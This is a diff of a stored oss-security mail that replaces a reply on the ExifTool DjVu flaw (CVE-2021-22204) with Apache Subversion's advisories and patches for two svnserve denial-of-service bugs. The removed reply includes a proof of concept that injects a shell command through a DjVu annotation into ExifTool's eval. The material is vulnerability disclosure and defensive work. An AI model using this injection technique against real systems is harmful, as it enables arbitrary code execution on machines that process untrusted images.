@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1199" "Monday" "10" "May" "2021" "15:46:18" "+0200" "Jakub Wilk" "jwilk@jwilk.net" nil "34" "Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image" nil nil nil "5" nil nil (number mark "U       jwilk@jwilk. May 10   34/1199  " thread-indent "\"Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["25073" "Wednesday" "31" "July" "2019" "17:20:04" "+0100" "Julian Foad" "julianfoad@apache.org" "<a9167262-7fda-b9ba-eff7-35e98149ca34@apache.org>" "663" "[oss-security] [CVE-2018-11782, CVE-2019-0203] Apache Subversion svnserve vulnerabilities" nil nil nil "7" "2019073116:20:04" "[oss-security] [CVE-2018-11782, CVE-2019-0203] Apache Subversion svnserve vulnerabilities" (number mark "U       julianfoad@a Jul 31  663/25073 " thread-indent "\"[oss-security] [CVE-2018-11782, CVE-2019-0203] Apache Subversion svnserve vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2018-11782, CVE-2019-0203] Apache Subversion svnserve vulnerabilities" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 5281 invoked by uid 550); 10 May 2021 13:46:33 -0000
+Received: (qmail 21505 invoked by uid 550); 31 Jul 2019 17:11:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,63 +12,680 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5260 invoked from network); 10 May 2021 13:46:32 -0000
-Authentication-Results: garm.ovh; auth=pass (GARM-96R001433af0f7-8a92-48c6-89fa-cc5151d7a393,
-                    D6A8F79C329AAF9FAD043F409567DACFC528325F) smtp.auth=jwilk@jwilk.net
-X-OVh-ClientIp: 5.173.65.66
-Date: Mon, 10 May 2021 15:46:18 +0200
-From: Jakub Wilk <jwilk@jwilk.net>
-To: <oss-security@lists.openwall.com>
-Message-ID: <20210510134618.dcarjcit5ftpomdm@jwilk.net>
-Mail-Followup-To: oss-security@lists.openwall.com
-References: <CAPWJUnz=mf9+zHrrxgBYYZdQzDW-zKf0kCOeVY4y-61CeA9HPg@mail.gmail.com>
+Received: (qmail 17704 invoked from network); 31 Jul 2019 16:20:22 -0000
+To: oss-security@lists.openwall.com
+From: Julian Foad <julianfoad@apache.org>
+Message-ID: <a9167262-7fda-b9ba-eff7-35e98149ca34@apache.org>
+Date: Wed, 31 Jul 2019 17:20:04 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+ Thunderbird/60.8.0
 MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"; format=flowed
-Content-Disposition: inline
-In-Reply-To: <CAPWJUnz=mf9+zHrrxgBYYZdQzDW-zKf0kCOeVY4y-61CeA9HPg@mail.gmail.com>
-User-Agent: NeoMutt/20180716
-X-Originating-IP: [37.59.142.96]
-X-ClientProxiedBy: DAG6EX2.mxp6.local (172.16.2.52) To DAG4EX2.mxp6.local
- (172.16.2.32)
-X-Ovh-Tracer-GUID: 9b3db0b2-0a89-4d54-93c8-7d64d78c3821
-X-Ovh-Tracer-Id: 4119667763250976535
-X-VR-SPAMSTATE: OK
-X-VR-SPAMSCORE: 0
-X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeduledrvdegkedgieelucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkfhggtggujggfihesthdtredttdervdenucfhrhhomheplfgrkhhusgcuhghilhhkuceojhifihhlkhesjhifihhlkhdrnhgvtheqnecuggftrfgrthhtvghrnhephfefvdefheevhfekledtjeegleetfedvfedvuddvfefgudeuiedtieetvddthefgnecukfhppedtrddtrddtrddtpdefjedrheelrddugedvrdelieenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhhouggvpehsmhhtphdqohhuthdphhgvlhhopehmgihplhgrnheirdhmrghilhdrohhvhhdrnhgvthdpihhnvghtpedtrddtrddtrddtpdhmrghilhhfrhhomhepjhifihhlkhesjhifihhlkhdrnhgvthdprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhm
-Subject: Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code
- execution in the DjVu module when parsing a malicious image
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-GB
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] [CVE-2018-11782, CVE-2019-0203] Apache Subversion svnserve
+ vulnerabilities
 
-* William Bowling <will@wbowling.info>, 2021-05-09, 14:32:
->ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for 
->arbitrary code execution when parsing malicious images.
+The recent releases of Apache Subversion 1.12.2, 1.10.6, 1.9.12, contain fixes for two security issues, CVE-2018-11782 and CVE-2019-0203. These issues affect Subversion 'svnserve' servers. We encourage server operators to upgrade to the latest appropriate version as soon as reasonable. Please see the [release announcements] for more information about the releases.
 
-Using eval() to parse C-like strings is undoubtedly a terrible idea, but 
-the code does attempt to neutralize the input, and it wasn't immediately 
-obvious to me where the bug is. It turns out the way it determines where 
-the string ends is incorrect:
+To get the latest release from the nearest mirror, please visit our [download page].
 
-    # we're good unless quote was escaped by odd number of backslashes
-    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
+[CVE-2018-11782]
+http://subversion.apache.org/security/CVE-2018-11782-advisory.txt
 
-But $ doesn't match only the end of the string; it matches also before 
-the trailing newline. You need \z if you want only the former. (But of 
-course in this case ditching eval(), rather than fine-tuning the regex, 
-was the right course of action.)
+[CVE-2019-0203]
+http://subversion.apache.org/security/CVE-2019-0203-advisory.txt
 
-Proof of concept:
+[release announcements]
+https://lists.apache.org/list.html?announce@subversion.apache.org
 
-   $ printf 'P1 1 1 0' > moo.pbm
-   $ cjb2 moo.pbm moo.djvu
-   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned>&2);#"' >> moo.djvu
-   $ exiftool moo.djvu > /dev/null
-    _______
-   < pwned >
-    -------
-           \   ^__^
-            \  (oo)\_______
-               (__)\       )\/\
-                   ||----w |
-                   ||     ||
+[download page]
+http://subversion.apache.org/download.cgi#recommended-release
 
--- 
-Jakub Wilk
+Below are the advisories, with patches to fix the problems.  The patches
+apply to Subversion 1.12.0, 1.10.4, 1.9.10.  Subversion 1.12.2, 1.10.6,
+1.9.12 will include the patches below, as well as other stability and bug
+fixes.  You can get an advance copy of the source distribution here:
+
+  https://dist.apache.org/repos/dist/release/subversion/?p=34990
+
+Here are the full advisories:
+
+Advisory for CVE-2019-0203:
+{{{
+  Remote unauthenticated denial-of-service in Subversion svnserve.
+
+Summary:
+========
+
+  Subversion's svnserve server process may exit when a client sends certain
+  sequences of protocol commands.
+
+  This can lead to disruption for users of the server.
+
+Known vulnerable:
+=================
+
+  Subversion svnserve servers through 1.9.10 (inclusive).
+  Subversion svnserve servers 1.10.0 through 1.10.4 (inclusive).
+  Subversion svnserve servers 1.11.0 through 1.11.1 (inclusive).
+  Subversion svnserve servers 1.12.0 through 1.12.0 (inclusive).
+
+  mod_dav_svn (any version) is not affected.
+
+Known fixed:
+============
+
+  Subversion svnserve servers 1.9.11
+  Subversion svnserve servers 1.10.5
+  Subversion svnserve servers 1.12.1
+
+  (Subversion 1.11.x is not a supported release line.)
+
+Details:
+========
+
+  A null-pointer-dereference has been found in svnserve that results in a
+  remote unauthenticated Denial-of-Service in some server configurations.
+
+  The vulnerability can be triggered by an unauthenticated user if the
+  server is configured with anonymous access enabled.
+
+  The problem originates in opening a new connection to svnserve. On failure
+  to find the specified repository or to be authorized to access it,
+  svnserve logs and reports the error, but also keeps the connection open
+  despite its incomplete initialization. If the client sends any further
+  command on the same connection, then a null-pointer-dereference occurs in
+  svnserve.
+
+Severity:
+=========
+
+  CVSSv3 Base Score: 7.5 (High)
+  CVSSv3 Base Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+
+  Exploitation results in denial of service by crashing an svnserve
+  process. The impact of this differs depending on how svnserve is
+  launched, including the different run modes selected by options such
+  as "svnserve -d", "svnserve -T -d", "svnserve -t", and "svnserve -i".
+
+Recommendations:
+================
+
+  We recommend all users to upgrade to a known fixed release of the
+  Subversion svnserve server.
+
+  Users who are unable to upgrade may apply the included patches.
+
+References:
+===========
+
+  CVE-2019-0203 (Subversion)
+
+Reported by:
+============
+
+  Tomas Bortoli <tomasbortoli@gmail.com>
+
+Patches:
+========
+
+  Patch for Subversion 1.12, 1.10, 1.9:
+[[[
+Index: subversion/svnserve/serve.c
+===================================================================
+--- subversion/svnserve/serve.c
++++ subversion/svnserve/serve.c
+@@ -4125,7 +4125,7 @@ construct_server_baton
+                        serve_params_t *params,
+                        apr_pool_t *scratch_pool)
+ {
+-  svn_error_t *err, *io_err;
++  svn_error_t *err;
+   apr_uint64_t ver;
+   const char *client_url, *ra_client_string, *client_string;
+   svn_ra_svn__list_t *caplist;
+@@ -4267,11 +4267,12 @@
+     }
+   if (err)
+     {
+-      log_error(err, b);
+-      io_err = svn_ra_svn__write_cmd_failure(conn, scratch_pool, err);
+-      svn_error_clear(err);
+-      SVN_ERR(io_err);
+-      return svn_ra_svn__flush(conn, scratch_pool);
++      /* Report these errors to the client before closing the connection. */
++      err = svn_error_compose_create(err,
++              svn_ra_svn__write_cmd_failure(conn, scratch_pool, err));
++      err = svn_error_compose_create(err,
++              svn_ra_svn__flush(conn, scratch_pool));
++      return err;
+     }
+
+   SVN_ERR(svn_fs_get_uuid(b->repository->fs, &b->repository->uuid,
+
+]]]
+
+}}}
+
+Advisory for CVE-2018-11782:
+{{{
+  Remotely triggerable DoS vulnerability in svnserve 'get-deleted-rev'.
+
+Summary:
+========
+
+  Subversion's svnserve server process may exit when a well-formed
+  read-only request produces a particular answer.
+
+  This can lead to disruption for users of the server.
+
+Known vulnerable:
+=================
+
+  Subversion svnserve servers through 1.9.10 (inclusive).
+  Subversion svnserve servers 1.10.0 through 1.10.4 (inclusive).
+  Subversion svnserve servers 1.11.0 through 1.11.1 (inclusive).
+  Subversion svnserve servers 1.12.0 through 1.12.0 (inclusive).
+
+  mod_dav_svn (any version) is not affected.
+
+Known fixed:
+============
+
+  Subversion svnserve servers 1.9.11
+  Subversion svnserve servers 1.10.5
+  Subversion svnserve servers 1.12.1
+
+  (Subversion 1.11.x is not a supported release line.)
+
+Details:
+========
+
+  Subversion svn:// connections, including svn+ssh:// and svn+<custom>://, use
+  a custom network protocol [1] with Lisp-like syntax.  The code implementing
+  the protocol has dedicated codepaths for serialization of revision numbers
+  into protocol integers.  A particular client query could cause the server to
+  attempt to reply with a revision number whose value is the invalid revision
+  number constant `SVN_INVALID_REVNUM`, thereby triggering an assertion failure
+  in the the serialization layer.
+
+  [1] https://svn.apache.org/repos/asf/subversion/tags/1.10.0/subversion/libsvn_ra_svn/protocol
+
+Severity:
+=========
+
+  CVSSv3 Base Score: 6.5 (Medium)
+  CVSSv3 Base Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
+
+  Exploitation results in denial of service by crashing an svnserve
+  process. The impact of this differs depending on how svnserve is
+  launched, including the different run modes selected by options such
+  as "svnserve -d", "svnserve -T -d", "svnserve -t", and "svnserve -i".
+
+Recommendations:
+================
+
+  We recommend all users to upgrade to a known fixed release of the
+  Subversion svnserve server.
+
+  The same releases also include changes in the client side. These
+  client-side changes are not needed to fix the server vulnerability.
+  Upgrading the clients to one of these releases provides an ordinary bug
+  fix that make the case in question work correctly when operating against
+  an upgraded server.
+
+  - With a new client against a new server, such queries are now handled
+    correctly.
+
+  - With an old client against a new server, the client will report a more
+    informative error message, and the server will not crash.
+
+  - With a new client against an old server, the behaviour is the same as
+    with an old client against an old server.
+
+  Users who are unable to upgrade may apply the included patches.
+
+References:
+===========
+
+  CVE-2018-11782 (Subversion)
+
+Reported by:
+============
+
+  Ace Olszowka, Build Master, Computers Unlimited
+
+Patches:
+========
+
+  Patch against Subversion 1.12.0, 1.10.4:
+[[[
+Index: subversion/libsvn_ra_svn/client.c
+===================================================================
+--- subversion/libsvn_ra_svn/client.c
++++ subversion/libsvn_ra_svn/client.c
+@@ -3102,25 +3102,38 @@ ra_svn_get_deleted_rev(svn_ra_session_t
+                        svn_revnum_t *revision_deleted,
+                        apr_pool_t *pool)
+ 
+ {
+   svn_ra_svn__session_baton_t *sess_baton = session->priv;
+   svn_ra_svn_conn_t *conn = sess_baton->conn;
++  svn_error_t *err;
+ 
+   path = reparent_path(session, path, pool);
+ 
+   /* Transmit the parameters. */
+   SVN_ERR(svn_ra_svn__write_cmd_get_deleted_rev(conn, pool, path,
+                                                peg_revision, end_revision));
+ 
+   /* Servers before 1.6 don't support this command.  Check for this here. */
+   SVN_ERR(handle_unsupported_cmd(handle_auth_request(sess_baton, pool),
+                                  N_("'get-deleted-rev' not implemented")));
+ 
+-  return svn_error_trace(svn_ra_svn__read_cmd_response(conn, pool, "r",
+-                                                       revision_deleted));
++  err = svn_error_trace(svn_ra_svn__read_cmd_response(conn, pool, "r",
++                                                      revision_deleted));
++  /* The protocol does not allow for a reply of SVN_INVALID_REVNUM directly.
++     Instead, a new enough server returns SVN_ERR_ENTRY_MISSING_REVISION to
++     indicate the answer to the query is SVN_INVALID_REVNUM. (An older server
++     closes the connection and returns SVN_ERR_RA_SVN_CONNECTION_CLOSED.) */
++  if (err && err->apr_err == SVN_ERR_ENTRY_MISSING_REVISION)
++    {
++      *revision_deleted = SVN_INVALID_REVNUM;
++      svn_error_clear(err);
++    }
++  else
++    SVN_ERR(err);
++  return SVN_NO_ERROR;
+ }
+ 
+ static svn_error_t *
+ ra_svn_register_editor_shim_callbacks(svn_ra_session_t *session,
+                                       svn_delta_shim_callbacks_t *callbacks)
+ {
+Index: subversion/svnserve/serve.c
+===================================================================
+--- subversion/svnserve/serve.c
++++ subversion/svnserve/serve.c
+@@ -3513,14 +3513,27 @@ get_deleted_rev(svn_ra_svn_conn_t *conn,
+   SVN_ERR(svn_ra_svn__parse_tuple(params, "crr",
+                                  &path, &peg_revision, &end_revision));
+   full_path = svn_fspath__join(b->repository->fs_path->data,
+                                svn_relpath_canonicalize(path, pool), pool);
+   SVN_ERR(log_command(b, conn, pool, "get-deleted-rev"));
+   SVN_ERR(trivial_auth_request(conn, pool, b));
+-  SVN_ERR(svn_repos_deleted_rev(b->repository->fs, full_path, peg_revision,
+-                                end_revision, &revision_deleted, pool));
++  SVN_CMD_ERR(svn_repos_deleted_rev(b->repository->fs, full_path, peg_revision,
++                                    end_revision, &revision_deleted, pool));
++
++  /* The protocol does not allow for a reply of SVN_INVALID_REVNUM directly.
++     Instead, return SVN_ERR_ENTRY_MISSING_REVISION. A new enough client
++     knows that this means the answer to the query is SVN_INVALID_REVNUM.
++     (An older client reports this as an error.) */
++  if (revision_deleted == SVN_INVALID_REVNUM)
++    SVN_CMD_ERR(svn_error_createf(SVN_ERR_ENTRY_MISSING_REVISION, NULL,
++                                  "svn protocol command 'get-deleted-rev': "
++                                  "path '%s' was not deleted in r%ld-%ld; "
++                                  "NOTE: newer clients handle this case "
++                                  "and do not report it as an error",
++                                  full_path, peg_revision, end_revision));
++
+   SVN_ERR(svn_ra_svn__write_cmd_response(conn, pool, "r", revision_deleted));
+   return SVN_NO_ERROR;
+ }
+ 
+ static svn_error_t *
+ get_inherited_props(svn_ra_svn_conn_t *conn,
+Index: subversion/tests/libsvn_ra/ra-test.c
+===================================================================
+--- subversion/tests/libsvn_ra/ra-test.c
++++ subversion/tests/libsvn_ra/ra-test.c
+@@ -91,12 +91,47 @@ commit_changes(svn_ra_session_t *session
+   SVN_ERR(editor->close_directory(dir_baton, pool));
+   SVN_ERR(editor->close_directory(root_baton, pool));
+   SVN_ERR(editor->close_edit(edit_baton, pool));
+   return SVN_NO_ERROR;
+ }
+ 
++/* Commit two revisions: add 'B', then delete 'A' */
++static svn_error_t *
++commit_two_changes(svn_ra_session_t *session,
++                   apr_pool_t *pool)
++{
++  apr_hash_t *revprop_table = apr_hash_make(pool);
++  const svn_delta_editor_t *editor;
++  void *edit_baton;
++  void *root_baton, *dir_baton;
++
++  /* mkdir B */
++  SVN_ERR(svn_ra_get_commit_editor3(session, &editor, &edit_baton,
++                                    revprop_table,
++                                    NULL, NULL, NULL, TRUE, pool));
++  SVN_ERR(editor->open_root(edit_baton, SVN_INVALID_REVNUM,
++                            pool, &root_baton));
++  SVN_ERR(editor->add_directory("B", root_baton, NULL, SVN_INVALID_REVNUM,
++                               pool, &dir_baton));
++  SVN_ERR(editor->close_directory(dir_baton, pool));
++  SVN_ERR(editor->close_directory(root_baton, pool));
++  SVN_ERR(editor->close_edit(edit_baton, pool));
++
++  /* delete A */
++  SVN_ERR(svn_ra_get_commit_editor3(session, &editor, &edit_baton,
++                                    revprop_table,
++                                    NULL, NULL, NULL, TRUE, pool));
++  SVN_ERR(editor->open_root(edit_baton, SVN_INVALID_REVNUM,
++                            pool, &root_baton));
++  SVN_ERR(editor->delete_entry("A", SVN_INVALID_REVNUM, root_baton, pool));
++  SVN_ERR(editor->close_directory(root_baton, pool));
++  SVN_ERR(editor->close_edit(edit_baton, pool));
++
++  return SVN_NO_ERROR;
++}
++
+ static svn_error_t *
+ commit_tree(svn_ra_session_t *session,
+             apr_pool_t *pool)
+ {
+   apr_hash_t *revprop_table = apr_hash_make(pool);
+   const svn_delta_editor_t *editor;
+@@ -1781,12 +1816,62 @@ commit_locked_file(const svn_test_opts_t
+   SVN_TEST_ASSERT(propval);
+   SVN_TEST_STRING_ASSERT(propval->data, "propval");
+ 
+   return SVN_NO_ERROR;
+ }
+ 
++/* Cases of 'get-deleted-rev' that should return SVN_INVALID_REVNUM. */
++static svn_error_t *
++test_get_deleted_rev_no_delete(const svn_test_opts_t *opts,
++                               apr_pool_t *pool)
++{
++  svn_ra_session_t *ra_session;
++  svn_revnum_t revision_deleted;
++
++  SVN_ERR(make_and_open_repos(&ra_session,
++                              "test-repo-get-deleted-rev-no-delete", opts,
++                              pool));
++  SVN_ERR(commit_changes(ra_session, pool));
++  SVN_ERR(commit_two_changes(ra_session, pool));
++
++  /* expect 'no deletion' in the range up to r2, when it is deleted in r3 */
++  /* This was failing over RA-SVN where the 'get-deleted-rev' wire command's
++     prototype cannot directly represent that result. A new enough client and
++     server collaborate on a work-around implemented using an error code. */
++  SVN_ERR(svn_ra_get_deleted_rev(ra_session, "A", 1, 2,
++                                 &revision_deleted, pool));
++  SVN_TEST_INT_ASSERT(revision_deleted, SVN_INVALID_REVNUM);
++
++  /* this connection should still be open: a simple case should still work */
++  SVN_ERR(svn_ra_get_deleted_rev(ra_session, "A", 1, 3,
++                                 &revision_deleted, pool));
++  SVN_TEST_INT_ASSERT(revision_deleted, 3);
++
++  return SVN_NO_ERROR;
++}
++
++/* Cases of 'get-deleted-rev' that should return an error. */
++static svn_error_t *
++test_get_deleted_rev_errors(const svn_test_opts_t *opts,
++                               apr_pool_t *pool)
++{
++  svn_ra_session_t *ra_session;
++  svn_revnum_t revision_deleted;
++
++  SVN_ERR(make_and_open_repos(&ra_session,
++                              "test-repo-get-deleted-rev-errors", opts, pool));
++  SVN_ERR(commit_changes(ra_session, pool));
++
++  /* expect an error when searching up to r3, when repository head is r1 */
++  SVN_TEST_ASSERT_ERROR(svn_ra_get_deleted_rev(ra_session, "A", 1, 3,
++                                               &revision_deleted, pool),
++                        SVN_ERR_FS_NO_SUCH_REVISION);
++
++  return SVN_NO_ERROR;
++}
++
+ 
+ /* The test table.  */
+ 
+ static int max_threads = 4;
+ 
+ static struct svn_test_descriptor_t test_funcs[] =
+@@ -1817,10 +1902,14 @@ static struct svn_test_descriptor_t test
+     SVN_TEST_OPTS_PASS(tunnel_run_checkout,
+                        "verify checkout over a tunnel"),
+     SVN_TEST_OPTS_PASS(commit_empty_last_change,
+                        "check how last change applies to empty commit"),
+     SVN_TEST_OPTS_PASS(commit_locked_file,
+                        "check commit editor for a locked file"),
++    SVN_TEST_OPTS_PASS(test_get_deleted_rev_no_delete,
++                       "test get-deleted-rev no delete"),
++    SVN_TEST_OPTS_PASS(test_get_deleted_rev_errors,
++                       "test get-deleted-rev errors"),
+     SVN_TEST_NULL
+   };
+ 
+ SVN_TEST_MAIN
+]]]
+
+  Patch against Subversion 1.9.10
+[[[
+Index: subversion/libsvn_ra_svn/client.c
+===================================================================
+--- subversion/libsvn_ra_svn/client.c
++++ subversion/libsvn_ra_svn/client.c
+@@ -2837,6 +2837,7 @@
+ {
+   svn_ra_svn__session_baton_t *sess_baton = session->priv;
+   svn_ra_svn_conn_t *conn = sess_baton->conn;
++  svn_error_t *err;
+ 
+   /* Transmit the parameters. */
+   SVN_ERR(svn_ra_svn__write_cmd_get_deleted_rev(conn, pool, path,
+@@ -2846,8 +2847,20 @@
+   SVN_ERR(handle_unsupported_cmd(handle_auth_request(sess_baton, pool),
+                                  N_("'get-deleted-rev' not implemented")));
+ 
+-  return svn_error_trace(svn_ra_svn__read_cmd_response(conn, pool, "r",
+-                                                       revision_deleted));
++  err = svn_error_trace(svn_ra_svn__read_cmd_response(conn, pool, "r",
++                                                      revision_deleted));
++  /* The protocol does not allow for a reply of SVN_INVALID_REVNUM directly.
++     Instead, a new enough server returns SVN_ERR_ENTRY_MISSING_REVISION to
++     indicate the answer to the query is SVN_INVALID_REVNUM. (An older server
++     closes the connection and returns SVN_ERR_RA_SVN_CONNECTION_CLOSED.) */
++  if (err && err->apr_err == SVN_ERR_ENTRY_MISSING_REVISION)
++    {
++      *revision_deleted = SVN_INVALID_REVNUM;
++      svn_error_clear(err);
++    }
++  else
++    SVN_ERR(err);
++  return SVN_NO_ERROR;
+ }
+ 
+ static svn_error_t *
+Index: subversion/svnserve/serve.c
+===================================================================
+--- subversion/svnserve/serve.c
++++ subversion/svnserve/serve.c
+@@ -3296,8 +3296,21 @@
+                                svn_relpath_canonicalize(path, pool), pool);
+   SVN_ERR(log_command(b, conn, pool, "get-deleted-rev"));
+   SVN_ERR(trivial_auth_request(conn, pool, b));
+-  SVN_ERR(svn_repos_deleted_rev(b->repository->fs, full_path, peg_revision,
+-                                end_revision, &revision_deleted, pool));
++  SVN_CMD_ERR(svn_repos_deleted_rev(b->repository->fs, full_path, peg_revision,
++                                    end_revision, &revision_deleted, pool));
++
++  /* The protocol does not allow for a reply of SVN_INVALID_REVNUM directly.
++     Instead, return SVN_ERR_ENTRY_MISSING_REVISION. A new enough client
++     knows that this means the answer to the query is SVN_INVALID_REVNUM.
++     (An older client reports this as an error.) */
++  if (revision_deleted == SVN_INVALID_REVNUM)
++    SVN_CMD_ERR(svn_error_createf(SVN_ERR_ENTRY_MISSING_REVISION, NULL,
++                                  "svn protocol command 'get-deleted-rev': "
++                                  "path '%s' was not deleted in r%ld-%ld; "
++                                  "NOTE: newer clients handle this case "
++                                  "and do not report it as an error",
++                                  full_path, peg_revision, end_revision));
++
+   SVN_ERR(svn_ra_svn__write_cmd_response(conn, pool, "r", revision_deleted));
+   return SVN_NO_ERROR;
+ }
+@@ -3768,7 +3781,7 @@
+                        serve_params_t *params,
+                        apr_pool_t *scratch_pool)
+ {
+-  svn_error_t *err, *io_err;
++  svn_error_t *err;
+   apr_uint64_t ver;
+   const char *client_url, *ra_client_string, *client_string;
+   apr_array_header_t *caplist;
+@@ -3900,11 +3913,12 @@
+     }
+   if (err)
+     {
+-      log_error(err, b);
+-      io_err = svn_ra_svn__write_cmd_failure(conn, scratch_pool, err);
+-      svn_error_clear(err);
+-      SVN_ERR(io_err);
+-      return svn_ra_svn__flush(conn, scratch_pool);
++      /* Report these errors to the client before closing the connection. */
++      err = svn_error_compose_create(err,
++              svn_ra_svn__write_cmd_failure(conn, scratch_pool, err));
++      err = svn_error_compose_create(err,
++              svn_ra_svn__flush(conn, scratch_pool));
++      return err;
+     }
+ 
+   SVN_ERR(svn_fs_get_uuid(b->repository->fs, &b->repository->uuid,
+Index: subversion/tests/libsvn_ra/ra-test.c
+===================================================================
+--- subversion/tests/libsvn_ra/ra-test.c
++++ subversion/tests/libsvn_ra/ra-test.c
+@@ -93,6 +93,41 @@
+   return SVN_NO_ERROR;
+ }
+ 
++/* Commit two revisions: add 'B', then delete 'A' */
++static svn_error_t *
++commit_two_changes(svn_ra_session_t *session,
++                   apr_pool_t *pool)
++{
++  apr_hash_t *revprop_table = apr_hash_make(pool);
++  const svn_delta_editor_t *editor;
++  void *edit_baton;
++  void *root_baton, *dir_baton;
++
++  /* mkdir B */
++  SVN_ERR(svn_ra_get_commit_editor3(session, &editor, &edit_baton,
++                                    revprop_table,
++                                    NULL, NULL, NULL, TRUE, pool));
++  SVN_ERR(editor->open_root(edit_baton, SVN_INVALID_REVNUM,
++                            pool, &root_baton));
++  SVN_ERR(editor->add_directory("B", root_baton, NULL, SVN_INVALID_REVNUM,
++                               pool, &dir_baton));
++  SVN_ERR(editor->close_directory(dir_baton, pool));
++  SVN_ERR(editor->close_directory(root_baton, pool));
++  SVN_ERR(editor->close_edit(edit_baton, pool));
++
++  /* delete A */
++  SVN_ERR(svn_ra_get_commit_editor3(session, &editor, &edit_baton,
++                                    revprop_table,
++                                    NULL, NULL, NULL, TRUE, pool));
++  SVN_ERR(editor->open_root(edit_baton, SVN_INVALID_REVNUM,
++                            pool, &root_baton));
++  SVN_ERR(editor->delete_entry("A", SVN_INVALID_REVNUM, root_baton, pool));
++  SVN_ERR(editor->close_directory(root_baton, pool));
++  SVN_ERR(editor->close_edit(edit_baton, pool));
++
++  return SVN_NO_ERROR;
++}
++
+ static svn_error_t *
+ commit_tree(svn_ra_session_t *session,
+             apr_pool_t *pool)
+@@ -842,6 +877,63 @@
+ }
+ 
+ 
+
++/* Cases of 'get-deleted-rev' that should return SVN_INVALID_REVNUM. */
++static svn_error_t *
++test_get_deleted_rev_no_delete(const svn_test_opts_t *opts,
++                               apr_pool_t *pool)
++{
++  svn_ra_session_t *ra_session;
++  svn_revnum_t revision_deleted;
++
++  SVN_ERR(make_and_open_repos(&ra_session,
++                              "test-repo-get-deleted-rev-no-delete", opts,
++                              pool));
++  SVN_ERR(commit_changes(ra_session, pool));
++  SVN_ERR(commit_two_changes(ra_session, pool));
++
++  /* expect 'no deletion' in the range up to r2, when it is deleted in r3 */
++  /* This was failing over RA-SVN where the 'get-deleted-rev' wire command's
++     prototype cannot directly represent that result. A new enough client and
++     server collaborate on a work-around implemented using an error code. */
++  SVN_ERR(svn_ra_get_deleted_rev(ra_session, "A", 1, 2,
++                                 &revision_deleted, pool));
++  SVN_TEST_INT_ASSERT(revision_deleted, SVN_INVALID_REVNUM);
++
++  /* this connection should still be open: a simple case should still work */
++  SVN_ERR(svn_ra_get_deleted_rev(ra_session, "A", 1, 3,
++                                 &revision_deleted, pool));
++  SVN_TEST_INT_ASSERT(revision_deleted, 3);
++
++  return SVN_NO_ERROR;
++}
++
++/* Cases of 'get-deleted-rev' that should return an error. */
++static svn_error_t *
++test_get_deleted_rev_errors(const svn_test_opts_t *opts,
++                               apr_pool_t *pool)
++{
++  svn_ra_session_t *ra_session;
++  svn_revnum_t revision_deleted;
++  svn_error_t *err;
++
++  SVN_ERR(make_and_open_repos(&ra_session,
++                              "test-repo-get-deleted-rev-errors", opts, pool));
++  SVN_ERR(commit_changes(ra_session, pool));
++
++  /* expect an error when searching up to r3, when repository head is r1 */
++  err = svn_ra_get_deleted_rev(ra_session, "A", 1, 3, &revision_deleted, pool);
++
++  /* mod_dav_svn returns a generic error code for "500 Internal Server Error";
++   * the other RA layers return the specific error code for "no such revision".
++   * We should make these consistent, but for now that's how it is. */
++  if (opts->repos_url && strncmp(opts->repos_url, "http", 4) == 0)
++    SVN_TEST_ASSERT_ERROR(err, SVN_ERR_RA_DAV_REQUEST_FAILED);
++  else
++    SVN_TEST_ASSERT_ERROR(err, SVN_ERR_FS_NO_SUCH_REVISION);
++
++  return SVN_NO_ERROR;
++}
++
+ /* The test table.  */
+ 
+ static int max_threads = 2;
+@@ -867,6 +959,10 @@
+                        "check list has_props performance"),
+     SVN_TEST_OPTS_PASS(tunnel_run_checkout,
+                        "verify checkout over a tunnel"),
++    SVN_TEST_OPTS_PASS(test_get_deleted_rev_no_delete,
++                       "test get-deleted-rev no delete"),
++    SVN_TEST_OPTS_PASS(test_get_deleted_rev_errors,
++                       "test get-deleted-rev errors"),
+     SVN_TEST_NULL
+   };
+ 
+]]]
+
+}}}
